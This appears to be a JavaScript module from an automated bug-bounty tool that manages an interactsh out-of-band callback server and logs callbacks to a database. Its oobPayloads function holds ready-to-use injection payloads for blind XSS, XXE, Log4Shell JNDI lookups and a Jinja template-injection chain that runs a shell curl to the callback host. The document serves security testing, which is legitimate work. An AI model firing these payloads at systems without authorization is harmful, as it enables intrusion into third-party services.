"use strict";

/**
 * interactsh.js — interactsh-client integration.
 *
 * Responsibilities:
 *  - Read the registered host from /tmp/agentic-bb-interactsh-host.txt
 *  - Generate traceable OOB URLs: {report_id}.{target_handle}.{host}
 *  - Tail the JSONL log and parse incoming callbacks
 *  - Persist callbacks to DB and trigger notifications
 *
 * Usage:
 *   const ix = require("./interactsh");
 *   const host = ix.getHost();           // "abc123.oast.fun" or null
 *   const url  = ix.oobUrl("WEB-001", "acme");  // "web-001.acme.abc123.oast.fun"
 *   ix.startWatcher(db, onCallback);     // tail log, persist, notify
 *   ix.stopWatcher();
 */

const fs   = require("node:fs");
const path = require("node:path");
const { execSync } = require("node:child_process");

const PID_FILE  = "/tmp/agentic-bb-interactsh.pid";
const HOST_FILE = "/tmp/agentic-bb-interactsh-host.txt";
const LOG_FILE  = "/tmp/agentic-bb-interactsh.jsonl";

// ── Host resolution ───────────────────────────────────────────────────────────

/**
 * Returns the registered interactsh host, or null if not running.
 */
function getHost() {
  try {
    const host = fs.readFileSync(HOST_FILE, "utf8").trim();
    return host && host !== "pending" ? host : null;
  } catch {
    return null;
  }
}

/**
 * Returns true if the interactsh daemon is running.
 */
function isRunning() {
  try {
    const pid = fs.readFileSync(PID_FILE, "utf8").trim();
    process.kill(Number(pid), 0);
    return true;
  } catch {
    return false;
  }
}

/**
 * Ensure interactsh is running — start it if not.
 * Returns the host string, or throws if startup fails after timeout.
 */
function ensureRunning({ timeoutMs = 20000 } = {}) {
  if (isRunning()) {
    const host = getHost();
    if (host) return host;
  }

  const scriptPath = path.resolve(__dirname, "../start-interactsh.sh");
  execSync(`bash "${scriptPath}"`, { stdio: "inherit" });

  // Poll for host
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    const host = getHost();
    if (host) return host;
    // Synchronous sleep — only used at startup
    execSync("sleep 0.5");
  }

  throw new Error(
    `interactsh host not available after ${timeoutMs / 1000}s. ` +
    `Check: cat /tmp/agentic-bb-interactsh.err`
  );
}

// ── URL generation ────────────────────────────────────────────────────────────

/**
 * Generate a traceable OOB URL for a finding.
 *
 * Format: {report_id}.{target_handle}.{interactsh_host}
 * Example: web-001.acme.abc123.oast.fun
 *
 * @param {string} reportId      — e.g. "WEB-001"
 * @param {string} targetHandle  — e.g. "acme"
 * @param {string} [host]        — override host (defaults to getHost())
 * @returns {string|null}
 */
function oobUrl(reportId, targetHandle, host) {
  const h = host || getHost();
  if (!h) return null;
  const id     = (reportId     || "unknown").toLowerCase().replace(/[^a-z0-9-]/g, "-");
  const target = (targetHandle || "unknown").toLowerCase().replace(/[^a-z0-9-]/g, "-");
  return `${id}.${target}.${h}`;
}

/**
 * Generate all OOB payload variants for a finding.
 *
 * @param {string} reportId
 * @param {string} targetHandle
 * @returns {object|null}  — { domain, http, https, blind_xss, xxe, ssrf_dns }
 */
function oobPayloads(reportId, targetHandle) {
  const domain = oobUrl(reportId, targetHandle);
  if (!domain) return null;

  return {
    domain,
    http:       `http://${domain}/`,
    https:      `https://${domain}/`,
    blind_xss:  `"><script src="///${domain}/x.js"></script>`,
    xxe:        `<!DOCTYPE x [<!ENTITY oob SYSTEM "http://${domain}/">]><x>&oob;</x>`,
    ssrf_dns:   domain,
    curl:       `curl http://${domain}/`,
    img:        `<img src="http://${domain}/" onerror="fetch('http://${domain}/err')">`,
    log4j:      `\${jndi:dns://${domain}/a}`,
    ssti_jinja: `{{request.environ['HTTP_HOST'].__class__.__mro__[1].__subclasses__()[40]('curl http://${domain}/',shell=True,stdout=-1).communicate()}}`
  };
}

// ── Log watcher ───────────────────────────────────────────────────────────────

let _watcherInterval = null;
let _lastOffset      = 0;

/**
 * Parse a raw interactsh JSONL line into a normalized callback object.
 * interactsh-client -json output format:
 * {
 *   "protocol": "dns|http|smtp",
 *   "unique-id": "abc123",
 *   "full-id": "web-001.acme.abc123.oast.fun",
 *   "q-type": "A",
 *   "raw-request": "...",
 *   "raw-response": "...",
 *   "remote-address": "1.2.3.4:12345",
 *   "timestamp": "2026-03-23T10:00:00Z"
 * }
 */
function parseCallback(line) {
  try {
    const raw = JSON.parse(line.trim());
    const fullId = raw["full-id"] || raw["unique-id"] || "";

    // Extract report_id and target_handle from subdomain prefix
    // Format: {report_id}.{target_handle}.{base_host...}
    const parts        = fullId.split(".");
    const reportId     = parts.length >= 2 ? parts[0].toUpperCase().replace(/-/g, "-") : null;
    const targetHandle = parts.length >= 3 ? parts[1] : null;

    return {
      full_id:       fullId,
      report_id:     reportId     || null,
      target_handle: targetHandle || null,
      protocol:      raw.protocol || null,
      source_ip:     (raw["remote-address"] || "").split(":")[0] || null,
      raw_request:   raw["raw-request"]  || null,
      raw_response:  raw["raw-response"] || null,
      timestamp:     raw.timestamp || new Date().toISOString()
    };
  } catch {
    return null;
  }
}

/**
 * Start tailing the interactsh JSONL log.
 * Calls onCallback(parsedCallback) for each new line.
 * Optionally persists to DB and sends notifications.
 *
 * @param {object}   db           — opened SQLite DB (from db.js)
 * @param {function} onCallback   — called with each parsed callback
 * @param {number}   pollMs       — polling interval (default 2000ms)
 */
function startWatcher(db, onCallback, pollMs = 2000) {
  if (_watcherInterval) return; // already watching

  _watcherInterval = setInterval(() => {
    if (!fs.existsSync(LOG_FILE)) return;

    try {
      const stat = fs.statSync(LOG_FILE);
      if (stat.size <= _lastOffset) return;

      const buf = Buffer.alloc(stat.size - _lastOffset);
      const fd  = fs.openSync(LOG_FILE, "r");
      fs.readSync(fd, buf, 0, buf.length, _lastOffset);
      fs.closeSync(fd);
      _lastOffset = stat.size;

      const lines = buf.toString("utf8").split("\n").filter(Boolean);
      for (const line of lines) {
        const cb = parseCallback(line);
        if (!cb) continue;

        // Persist to DB
        if (db) {
          try {
            const { recordCallback } = require("./db");
            recordCallback(db, cb);
          } catch { /* non-fatal */ }
        }

        // Notify
        if (onCallback) onCallback(cb);
      }
    } catch { /* file read error — skip */ }
  }, pollMs);

  if (_watcherInterval.unref) _watcherInterval.unref();
}

function stopWatcher() {
  if (_watcherInterval) {
    clearInterval(_watcherInterval);
    _watcherInterval = null;
  }
}

/**
 * Wait for a callback matching a specific report_id (polling DB).
 * Returns the first matching callback or null on timeout.
 *
 * @param {object} db
 * @param {string} reportId
 * @param {number} timeoutMs
 */
async function waitForCallback(db, reportId, timeoutMs = 30000) {
  const { getCallbacks } = require("./db");
  const since    = new Date().toISOString();
  const deadline = Date.now() + timeoutMs;

  return new Promise((resolve) => {
    const poll = setInterval(() => {
      const rows = getCallbacks(db, { report_id: reportId, since });
      if (rows.length > 0) {
        clearInterval(poll);
        resolve(rows[0]);
        return;
      }
      if (Date.now() >= deadline) {
        clearInterval(poll);
        resolve(null);
      }
    }, 1000);
    if (poll.unref) poll.unref();
  });
}

// ── Status summary ────────────────────────────────────────────────────────────

function status() {
  const running = isRunning();
  const host    = getHost();
  const logSize = (() => {
    try { return fs.statSync(LOG_FILE).size; } catch { return 0; }
  })();

  return {
    running,
    host:     host || null,
    log_file: LOG_FILE,
    log_size: logSize,
    pid_file: PID_FILE
  };
}

module.exports = {
  getHost,
  isRunning,
  ensureRunning,
  oobUrl,
  oobPayloads,
  startWatcher,
  stopWatcher,
  waitForCallback,
  parseCallback,
  status,
  LOG_FILE,
  HOST_FILE,
  PID_FILE
};
